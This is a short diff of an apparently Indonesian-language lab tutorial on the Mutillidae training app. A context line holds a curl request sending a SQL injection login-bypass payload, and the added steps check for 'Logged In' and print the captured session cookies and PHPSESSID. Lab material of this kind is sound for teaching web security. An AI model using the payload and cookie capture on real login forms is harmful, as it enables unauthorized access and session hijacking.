@@ -135,7 +135,14 @@ Lesson 6
     ```
     curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "username=samurai&password=%27+or+%281%3D1+and+username%3D%27samurai%27%29--+&login-php-submit-button=Login" --location "http://10.151.36.64/mutillidae/index.php?page=login.php" > login2.txt
     ```
-    
+- **Step 5**    : Cek status Autentikasi
+    ```
+    grep "Logged In" login2.txt
+    ```
+- **Step 5**    : menampilkan **session cookies** beserta **PHP session ID** (PHPSESSID)
+    ```
+    Cat crack_cookies.txt
+    ```
 
 
 
